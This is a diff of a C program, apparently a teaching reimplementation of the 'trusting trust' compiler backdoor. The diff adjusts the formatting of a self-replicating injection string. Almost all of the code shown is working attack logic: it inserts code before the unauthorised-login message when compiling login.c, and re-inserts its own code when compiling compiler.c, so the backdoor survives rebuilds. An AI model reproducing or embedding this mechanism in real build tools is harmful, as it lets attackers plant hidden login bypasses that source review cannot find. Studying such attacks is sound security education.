@@ -81,45 +81,45 @@ int main(int argc, char *argv[]){
 
 
 	const char * TEXT_INJECT_COMPILER = ""
-	"const char * TEXT_INJECT_LOGIN = %c%s%c;%c"
-	"if(strstr(sourceFilename, %clogin.c%c) != NULL){%c"
-		"char stringToInject[200];%c"
-		"snprintf(stringToInject, 200, TEXT_INJECT_LOGIN, 34, 34, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9);%c"
-		"int lengthOfMaliciousCode = strlen(stringToInject);%c"
-		"int newTotalBuffRequired = actualBuffSizeRequired + lengthOfMaliciousCode;%c"
-		"char * newTempBuffer = (char *) calloc(newTotalBuffRequired, sizeof(char));%c"
-		"char * injectPosition = strstr(buffer, %cprintf(TEXT_UNAUTHORISED);%c);%c"
-		"int sizeOfPreInjectedBuff = injectPosition - buffer;%c"
-		"strncpy(newTempBuffer, buffer, sizeOfPreInjectedBuff);%c"
-		"strncat(newTempBuffer, stringToInject, lengthOfMaliciousCode);%c"
-		"strcat(newTempBuffer, injectPosition);%c"
-		"free(buffer);%c"
-		"buffer = newTempBuffer;%c"
-		"sourceFileSize = newTotalBuffRequired - 1;%c"
-	"}%c"
-	"const char * TEXT_INJECT_COMPILER = %c%s%c;%c"
-	"if(strstr(sourceFilename, %ccompiler.c%c) != NULL){%c"
-		"char stringToInject[5000];%c"
-		"sprintf(stringToInject, TEXT_INJECT_COMPILER, 34, TEXT_INJECT_LOGIN, 34, 10, 34, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, TEXT_INJECT_COMPILER, 34, 10, 34, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10 ,10, 10);%c"
-		"int lengthOfMaliciousCode = strlen(stringToInject);%c"
-		"int newTotalBuffRequired = actualBuffSizeRequired + lengthOfMaliciousCode;%c"
-		"char * newTempBuffer = (char *) calloc(newTotalBuffRequired, sizeof(char));%c"
-		"char * injectPosition = strstr(buffer, %cchar compileCommand[500];%c);%c"
-		"int sizeOfPreInjectedBuff = injectPosition - buffer;%c"
-		"strncpy(newTempBuffer, buffer, sizeOfPreInjectedBuff);%c"
-		"strncat(newTempBuffer, stringToInject, lengthOfMaliciousCode);%c"
-		"strcat(newTempBuffer, injectPosition);%c"
-		"free(buffer);%c"
-		"buffer = newTempBuffer;%c"
-		"sourceFileSize = newTotalBuffRequired - 1;%c"
-	"}%c";
+	"const char * TEXT_INJECT_LOGIN = %c%s%c;%c%c"
+	"%cif(strstr(sourceFilename, %clogin.c%c) != NULL){%c"
+		"%c%cchar stringToInject[200];%c"
+		"%c%csnprintf(stringToInject, 200, TEXT_INJECT_LOGIN, 34, 34, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9);%c"
+		"%c%cint lengthOfMaliciousCode = strlen(stringToInject);%c"
+		"%c%cint newTotalBuffRequired = actualBuffSizeRequired + lengthOfMaliciousCode;%c"
+		"%c%cchar * newTempBuffer = (char *) calloc(newTotalBuffRequired, sizeof(char));%c"
+		"%c%cchar * injectPosition = strstr(buffer, %cprintf(TEXT_UNAUTHORISED);%c);%c"
+		"%c%cint sizeOfPreInjectedBuff = injectPosition - buffer;%c"
+		"%c%cstrncpy(newTempBuffer, buffer, sizeOfPreInjectedBuff);%c"
+		"%c%cstrncat(newTempBuffer, stringToInject, lengthOfMaliciousCode);%c"
+		"%c%cstrcat(newTempBuffer, injectPosition);%c"
+		"%c%cfree(buffer);%c"
+		"%c%cbuffer = newTempBuffer;%c"
+		"%c%csourceFileSize = newTotalBuffRequired - 1;%c"
+	"%c}%c%c"
+	"%cconst char * TEXT_INJECT_COMPILER = %c%s%c;%c%c"
+	"%cif(strstr(sourceFilename, %ccompiler.c%c) != NULL){%c"
+		"%c%cchar stringToInject[5000];%c"
+		"%c%csprintf(stringToInject, TEXT_INJECT_COMPILER, 34, TEXT_INJECT_LOGIN, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9, 34, TEXT_INJECT_COMPILER, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10 ,9, 9, 10, 9, 10, 10, 9);%c"
+		"%c%cint lengthOfMaliciousCode = strlen(stringToInject);%c"
+		"%c%cint newTotalBuffRequired = actualBuffSizeRequired + lengthOfMaliciousCode;%c"
+		"%c%cchar * newTempBuffer = (char *) calloc(newTotalBuffRequired, sizeof(char));%c"
+		"%c%cchar * injectPosition = strstr(buffer, %cchar compileCommand[500];%c);%c"
+		"%c%cint sizeOfPreInjectedBuff = injectPosition - buffer;%c"
+		"%c%cstrncpy(newTempBuffer, buffer, sizeOfPreInjectedBuff);%c"
+		"%c%cstrncat(newTempBuffer, stringToInject, lengthOfMaliciousCode);%c"
+		"%c%cstrcat(newTempBuffer, injectPosition);%c"
+		"%c%cfree(buffer);%c"
+		"%c%cbuffer = newTempBuffer;%c"
+		"%c%csourceFileSize = newTotalBuffRequired - 1;%c"
+	"%c}%c%c%c";
 
 	if(strstr(sourceFilename, "compiler.c") != NULL){
 
 		char stringToInject[5000];
 
 		//Generate malicious code
-		sprintf(stringToInject, TEXT_INJECT_COMPILER, 34, TEXT_INJECT_LOGIN, 34, 10, 34, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, TEXT_INJECT_COMPILER, 34, 10, 34, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10 ,10, 10);
+		sprintf(stringToInject, TEXT_INJECT_COMPILER, 34, TEXT_INJECT_LOGIN, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9, 34, TEXT_INJECT_COMPILER, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10 ,9, 9, 10, 9, 10, 10, 9);
 
 		printf("%s\n", stringToInject);
 
